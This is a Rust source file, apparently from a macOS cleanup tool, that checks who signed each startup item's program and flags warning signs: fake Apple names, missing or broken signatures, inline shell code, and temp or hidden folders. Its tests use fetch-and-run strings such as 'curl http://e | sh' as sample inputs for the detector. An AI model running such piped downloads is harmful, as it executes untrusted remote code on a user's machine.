//! Who signed what a startup item runs, and what about it looks wrong:
//! no signature, a broken one, a fake Apple name, code passed inline to a
//! shell, a temp or hidden folder. Signatures come from `codesign` and are
//! kept per program (path, size, change time), so each is read once.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::SystemTime;

/// Who signed a program.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Signer {
    /// Part of macOS.
    Apple,
    /// From the App Store.
    AppStore,
    /// A developer with an Apple Developer ID.
    DevId { name: String, team: String, notarized: bool },
    /// A development certificate (builds made on a developer's own Mac).
    Development { name: String },
    /// Signed with no identity: anyone can make that.
    AdHoc,
    Unsigned,
    /// Signed, but the files don't match the signature anymore.
    Broken,
    /// A script run by an interpreter; scripts carry no signature.
    Script,
    /// The program isn't there.
    Missing,
    /// `codesign` said something we don't know.
    Unknown,
}

impl Signer {
    /// One line for the item's menu.
    pub fn line(&self) -> String {
        match self {
            Signer::Apple => "Signed by Apple".into(),
            Signer::AppStore => "From the App Store".into(),
            Signer::DevId { name, team, notarized } => format!("Signed by {name} ({team}){}", if *notarized { " · notarized" } else { " · not notarized" }),
            Signer::Development { name } => format!("Development build · {name}"),
            Signer::AdHoc => "Ad-hoc signature (no developer)".into(),
            Signer::Unsigned => "Not signed".into(),
            Signer::Broken => "Signature doesn't match the files".into(),
            Signer::Script => "Script (no signature)".into(),
            Signer::Missing => "Program is missing".into(),
            Signer::Unknown => "Signature unknown".into(),
        }
    }
}

/// What looks wrong about an item.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum Flag {
    /// Named com.apple.* but not made by Apple.
    FakeApple,
    Unsigned,
    BrokenSignature,
    /// A shell or interpreter given code right on the command line.
    InlineCode,
    /// Runs from a temp or shared folder.
    TempFolder,
    /// Runs from a hidden folder.
    HiddenFolder,
    AdHoc,
    Script,
}

impl Flag {
    pub fn label(self) -> &'static str {
        match self {
            Flag::FakeApple => "fake Apple",
            Flag::Unsigned => "unsigned",
            Flag::BrokenSignature => "broken signature",
            Flag::InlineCode => "inline code",
            Flag::TempFolder => "temp folder",
            Flag::HiddenFolder => "hidden folder",
            Flag::AdHoc => "ad-hoc",
            Flag::Script => "script",
        }
    }
    /// Worth a look on its own (red); the rest are hints (amber).
    pub fn strong(self) -> bool {
        matches!(self, Flag::FakeApple | Flag::Unsigned | Flag::BrokenSignature | Flag::InlineCode | Flag::TempFolder)
    }
}

const INTERPRETERS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish", "python", "python2", "python3", "perl", "ruby", "node", "php", "osascript", "env", "tclsh", "pwsh"];

fn base(p: &Path) -> String {
    p.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default()
}

/// The program is a shell or script interpreter (any version: python3.12).
pub fn is_interpreter(program: &Path) -> bool {
    let b = base(program);
    INTERPRETERS.iter().any(|i| b == *i || (b.starts_with(i) && b[i.len()..].chars().all(|c| c.is_ascii_digit() || c == '.')))
}

/// For an interpreter: the code it's handed inline (`-c`, `-e`), if any.
pub fn inline_code(program: &Path, args: &[String]) -> bool {
    if !is_interpreter(program) {
        return false;
    }
    // args[0] is the program itself when it came from ProgramArguments
    args.iter().any(|a| a == "-c" || a == "-e" || a == "--eval" || a == "-command" || (a.starts_with('-') && !a.starts_with("--") && a.len() > 2 && a[1..].contains('c') && base(program).ends_with("sh")))
}

/// For an interpreter: the script file it runs (`/bin/bash /path/x.sh`).
pub fn script_of(program: &Path, args: &[String]) -> Option<PathBuf> {
    if !is_interpreter(program) || inline_code(program, args) {
        return None;
    }
    let mut it = args.iter().skip_while(|a| Path::new(a.as_str()) == program || base(Path::new(a.as_str())) == base(program));
    if base(program) == "env" {
        // env [-S] [VAR=x] interpreter script
        it.by_ref().find(|a| !a.starts_with('-') && !a.contains('='))?;
    }
    it.find(|a| !a.starts_with('-')).map(PathBuf::from).filter(|p| p.is_absolute())
}

/// Folders anyone can write to, or that are emptied on restart.
fn temp_place(p: &Path) -> bool {
    ["/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/tmp/", "/Users/Shared/", "/private/var/folders/", "/var/folders/"].iter().any(|t| p.starts_with(t))
}

/// A folder in the path starts with a dot (the file's own name doesn't count).
fn hidden_place(p: &Path) -> bool {
    let parent = p.parent().unwrap_or(Path::new(""));
    parent.components().any(|c| {
        let s = c.as_os_str().to_string_lossy();
        s.starts_with('.') && s != "." && s != ".."
    })
}

/// Covered by System Integrity Protection: only Apple can put files there.
pub fn sip_place(p: &Path) -> bool {
    let s = p.to_string_lossy();
    if s.starts_with("/usr/local/") {
        return false;
    }
    ["/System/", "/usr/", "/bin/", "/sbin/", "/Library/Apple/"].iter().any(|t| s.starts_with(t))
}

/// What runs is Apple's: its program (or script) sits where only Apple can
/// write, or is signed by Apple, and no code is handed to it inline.
/// `None` signature or a missing program count as Apple's (nothing to flag yet).
pub fn apple_owned(program: &Path, args: &[String], sig: Option<&Signer>) -> bool {
    if inline_code(program, args) {
        return false;
    }
    if let Some(script) = script_of(program, args) {
        return sip_place(&script);
    }
    sip_place(program) || matches!(sig, None | Some(Signer::Apple) | Some(Signer::Missing))
}

/// Homebrew's own folders: its programs are ad-hoc signed on purpose.
fn homebrew_place(p: &Path) -> bool {
    ["/opt/homebrew/", "/usr/local/Cellar/", "/usr/local/opt/", "/usr/local/Homebrew/"].iter().any(|t| p.starts_with(t))
}

/// What looks wrong about a program run with `args`, named `label`.
pub fn flags(label: &str, program: Option<&Path>, args: &[String], sig: Option<&Signer>) -> Vec<Flag> {
    let mut out = Vec::new();
    let Some(program) = program else { return out };
    let apple_name = label.to_ascii_lowercase().starts_with("com.apple.");
    let target = script_of(program, args);
    let place = target.as_deref().unwrap_or(program);
    if apple_name && !apple_owned(program, args, sig) && sig.is_some() {
        out.push(Flag::FakeApple);
    }
    match sig {
        Some(Signer::Unsigned) => out.push(Flag::Unsigned),
        Some(Signer::Broken) => out.push(Flag::BrokenSignature),
        // Homebrew and our own dev-built helper are ad-hoc on purpose
        Some(Signer::AdHoc) if !homebrew_place(place) && !label.starts_with("com.romanfurman6.") => out.push(Flag::AdHoc),
        Some(Signer::Script) => out.push(Flag::Script),
        _ => {}
    }
    if inline_code(program, args) {
        out.push(Flag::InlineCode);
    }
    if temp_place(place) || args.iter().skip(1).any(|a| temp_place(Path::new(a))) {
        out.push(Flag::TempFolder);
    }
    if hidden_place(place) {
        out.push(Flag::HiddenFolder);
    }
    out.sort();
    out.dedup();
    out
}

/// Read `codesign -dvv` output (it prints to stderr). `valid`: `codesign -v` passed.
pub fn parse_codesign(out: &str, valid: bool) -> Signer {
    if out.contains("not signed at all") {
        return Signer::Unsigned;
    }
    let mut authority = None;
    let mut team = String::new();
    let mut adhoc = false;
    for l in out.lines() {
        let l = l.trim();
        if let Some(a) = l.strip_prefix("Authority=") {
            // the first one is the signing certificate itself
            authority.get_or_insert(a.to_string());
        } else if let Some(t) = l.strip_prefix("TeamIdentifier=") {
            team = t.trim().to_string();
        } else if l == "Signature=adhoc" || (l.starts_with("CodeDirectory") && l.contains("flags=") && l.contains("adhoc")) {
            adhoc = true;
        }
    }
    let signer = match authority.as_deref() {
        Some("Software Signing") | Some("Apple Code Signing Certification Authority") => Signer::Apple,
        Some("Apple Mac OS Application Signing") | Some("Apple iPhone OS Application Signing") => Signer::AppStore,
        Some(a) if a.starts_with("Developer ID Application:") => {
            let rest = a.trim_start_matches("Developer ID Application:").trim();
            // "Name (TEAMID)"
            let name = rest.rsplit_once(" (").map(|(n, _)| n.to_string()).unwrap_or_else(|| rest.to_string());
            Signer::DevId { name, team: if team == "not set" { String::new() } else { team.clone() }, notarized: false }
        }
        Some(a) if a.starts_with("Apple Development:") || a.starts_with("Mac Developer:") => Signer::Development { name: a.split_once(':').map(|(_, n)| n.trim().to_string()).unwrap_or_default() },
        None if adhoc => Signer::AdHoc,
        None => Signer::Unknown,
        Some(_) => Signer::Unknown,
    };
    if !valid && !matches!(signer, Signer::Unknown) {
        return Signer::Broken;
    }
    signer
}

#[derive(Clone, PartialEq, Eq, Hash)]
struct Stamp {
    path: PathBuf,
    len: u64,
    changed: Option<SystemTime>,
}

fn stamp(p: &Path) -> Option<Stamp> {
    let m = std::fs::metadata(p).ok()?;
    Some(Stamp { path: p.to_path_buf(), len: m.len(), changed: m.modified().ok() })
}

static CACHE: Mutex<Option<HashMap<Stamp, Signer>>> = Mutex::new(None);

fn cached(s: &Stamp) -> Option<Signer> {
    CACHE.lock().ok()?.as_ref()?.get(s).cloned()
}

/// What to check for a program run with `args`: the script for an interpreter.
fn subject(program: &Path, args: &[String]) -> PathBuf {
    script_of(program, args).unwrap_or_else(|| program.to_path_buf())
}

/// The signer, if it was read before (never runs `codesign`).
pub fn known(program: &Path, args: &[String]) -> Option<Signer> {
    if is_interpreter(program) && script_of(program, args).is_some() {
        return Some(Signer::Script);
    }
    let p = subject(program, args);
    if crate::kit::fs::behind_folder_prompt(&p) {
        return Some(Signer::Unknown);
    }
    match stamp(&p) {
        Some(s) => cached(&s),
        None => Some(Signer::Missing),
    }
}

fn codesign(args: &[&str]) -> (bool, String) {
    match std::process::Command::new("/usr/bin/codesign").args(args).output() {
        Ok(o) => (o.status.success(), String::from_utf8_lossy(&o.stderr).into_owned()),
        Err(_) => (false, String::new()),
    }
}

/// Read who signed `program` (runs `codesign`; slow, so off the UI thread).
pub fn check(program: &Path, args: &[String]) -> Signer {
    if let Some(s) = known(program, args) {
        return s;
    }
    let p = subject(program, args);
    let Some(st) = stamp(&p) else { return Signer::Missing };
    let ps = p.to_string_lossy();
    let (_, info) = codesign(&["-dvv", &ps]);
    let (valid, _) = codesign(&["-v", &ps]);
    let mut s = parse_codesign(&info, valid);
    if let Signer::DevId { notarized, .. } = &mut s {
        *notarized = codesign(&["-v", "-R=notarized", "--check-notarization", &ps]).0;
    }
    if let Ok(mut g) = CACHE.lock() {
        g.get_or_insert_with(HashMap::new).insert(st, s.clone());
    }
    s
}

/// Check many programs a few at a time.
pub fn check_all(list: &[(PathBuf, Vec<String>)]) {
    let todo: Vec<&(PathBuf, Vec<String>)> = list.iter().filter(|(p, a)| known(p, a).is_none()).collect();
    if todo.is_empty() {
        return;
    }
    let per = todo.len().div_ceil(6);
    std::thread::scope(|sc| {
        for chunk in todo.chunks(per.max(1)) {
            sc.spawn(move || {
                for (p, a) in chunk {
                    check(p, a);
                }
            });
        }
    });
}

/// The SHA-256 of a file, as hex (for a VirusTotal lookup).
pub fn sha256(p: &Path) -> Option<String> {
    use sha2::{Digest, Sha256};
    use std::io::Read;
    let mut f = std::fs::File::open(p).ok()?;
    let mut h = Sha256::new();
    let mut buf = vec![0u8; 1 << 20];
    loop {
        let n = f.read(&mut buf).ok()?;
        if n == 0 {
            break;
        }
        h.update(&buf[..n]);
    }
    Some(h.finalize().iter().map(|b| format!("{b:02x}")).collect())
}

/// The file VirusTotal should look up for a program run with `args`
/// (the main binary of an app bundle path, or the script).
pub fn vt_subject(program: &Path, args: &[String]) -> PathBuf {
    subject(program, args)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn s(v: &[&str]) -> Vec<String> {
        v.iter().map(|x| x.to_string()).collect()
    }

    #[test]
    fn reads_codesign_output() {
        let apple = "Executable=/usr/libexec/x\nIdentifier=com.apple.x\nAuthority=Software Signing\nAuthority=Apple Code Signing Certification Authority\nAuthority=Apple Root CA\nTeamIdentifier=not set\n";
        assert_eq!(parse_codesign(apple, true), Signer::Apple);
        let dev = "Identifier=com.docker.vmnetd\nAuthority=Developer ID Application: Docker Inc (9BNSXJN65R)\nAuthority=Developer ID Certification Authority\nAuthority=Apple Root CA\nTeamIdentifier=9BNSXJN65R\n";
        assert_eq!(parse_codesign(dev, true), Signer::DevId { name: "Docker Inc".into(), team: "9BNSXJN65R".into(), notarized: false });
        assert_eq!(parse_codesign(dev, false), Signer::Broken);
        assert_eq!(parse_codesign("Executable=/x\nIdentifier=x\nCodeDirectory v=20400 size=1 flags=0x20002(adhoc,linker-signed) hashes=1+0\nSignature=adhoc\nTeamIdentifier=not set\n", true), Signer::AdHoc);
        assert_eq!(parse_codesign("/tmp/x: code object is not signed at all\n", false), Signer::Unsigned);
        assert_eq!(parse_codesign("Authority=Apple Mac OS Application Signing\n", true), Signer::AppStore);
        assert_eq!(parse_codesign("Authority=Apple Development: Roman F (ABC)\n", true), Signer::Development { name: "Roman F (ABC)".into() });
        assert_eq!(parse_codesign("", false), Signer::Unknown);
    }

    #[test]
    fn spots_interpreters_and_scripts() {
        let sh = Path::new("/bin/sh");
        assert!(is_interpreter(sh) && is_interpreter(Path::new("/usr/bin/python3.12")) && !is_interpreter(Path::new("/usr/bin/shasum")));
        assert!(inline_code(sh, &s(&["/bin/sh", "-c", "curl x | sh"])));
        assert!(inline_code(Path::new("/bin/bash"), &s(&["/bin/bash", "-lc", "x"])));
        assert!(inline_code(Path::new("/usr/bin/osascript"), &s(&["osascript", "-e", "do shell script"])));
        assert!(!inline_code(sh, &s(&["/bin/sh", "/Users/a/run.sh"])));
        assert!(!inline_code(Path::new("/Applications/X.app/Contents/MacOS/X"), &s(&["X", "-c", "conf"])));
        assert_eq!(script_of(sh, &s(&["/bin/sh", "/Users/a/run.sh", "--now"])), Some(PathBuf::from("/Users/a/run.sh")));
        assert_eq!(script_of(Path::new("/usr/bin/env"), &s(&["/usr/bin/env", "python3", "/opt/x.py"])), Some(PathBuf::from("/opt/x.py")));
        assert_eq!(script_of(Path::new("/usr/bin/python3"), &s(&["/usr/bin/python3", "-u", "/opt/y.py"])), Some(PathBuf::from("/opt/y.py")));
        assert_eq!(script_of(sh, &s(&["/bin/sh", "-c", "echo"])), None);
    }

    #[test]
    fn flags_what_looks_wrong() {
        let dev = Signer::DevId { name: "X".into(), team: "T".into(), notarized: true };
        // a clean third-party app
        assert!(flags("com.docker.helper", Some(Path::new("/Applications/Docker.app/Contents/MacOS/helper")), &[], Some(&dev)).is_empty());
        // pretending to be Apple, from a hidden folder in /Users/Shared, unsigned
        let f = flags("com.apple.updated", Some(Path::new("/Users/Shared/.x/updated")), &[], Some(&Signer::Unsigned));
        assert_eq!(f, vec![Flag::FakeApple, Flag::Unsigned, Flag::TempFolder, Flag::HiddenFolder]);
        // real Apple, wherever SIP covers it, isn't fake
        assert!(flags("com.apple.x", Some(Path::new("/usr/libexec/x")), &[], Some(&Signer::Apple)).is_empty());
        assert!(flags("com.apple.x", Some(Path::new("/Applications/Xcode.app/Contents/MacOS/x")), &[], Some(&Signer::Apple)).is_empty());
        // inline shell code
        let f = flags("com.x.y", Some(Path::new("/bin/sh")), &s(&["/bin/sh", "-c", "curl http://e | sh"]), Some(&Signer::Apple));
        assert_eq!(f, vec![Flag::InlineCode]);
        // an Apple name on Apple's shell, but with inline code, is not Apple's
        let f = flags("com.apple.y", Some(Path::new("/bin/sh")), &s(&["/bin/sh", "-c", "x"]), Some(&Signer::Apple));
        assert_eq!(f, vec![Flag::FakeApple, Flag::InlineCode]);
        assert!(apple_owned(Path::new("/bin/sh"), &s(&["/bin/sh", "/System/Library/x.sh"]), Some(&Signer::Script)));
        assert!(!apple_owned(Path::new("/bin/sh"), &s(&["/bin/sh", "/Users/a/x.sh"]), Some(&Signer::Script)));
        // homebrew's ad-hoc binaries are normal
        assert!(flags("homebrew.mxcl.redis", Some(Path::new("/opt/homebrew/opt/redis/bin/redis-server")), &[], Some(&Signer::AdHoc)).is_empty());
        assert_eq!(flags("com.x.y", Some(Path::new("/Users/a/bin/x")), &[], Some(&Signer::AdHoc)), vec![Flag::AdHoc]);
        assert!(flags("com.romanfurman6.cleanmebro.fanhelper", Some(Path::new("/Library/PrivilegedHelperTools/com.romanfurman6.cleanmebro.fanhelper")), &[], Some(&Signer::AdHoc)).is_empty());
        // a script under ~/.config
        let f = flags("com.x.s", Some(Path::new("/bin/bash")), &s(&["/bin/bash", "/Users/a/.config/s.sh"]), Some(&Signer::Script));
        assert_eq!(f, vec![Flag::HiddenFolder, Flag::Script]);
        // no program, nothing to say
        assert!(flags("com.apple.x", None, &[], None).is_empty());
        assert!(sip_place(Path::new("/usr/libexec/x")) && !sip_place(Path::new("/usr/local/bin/x")));
    }

    #[test]
    fn hashes_files() {
        let p = std::env::temp_dir().join(format!("cmb-sha-{}", std::process::id()));
        std::fs::write(&p, b"abc").unwrap();
        assert_eq!(sha256(&p).unwrap(), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
        let _ = std::fs::remove_file(&p);
    }
}
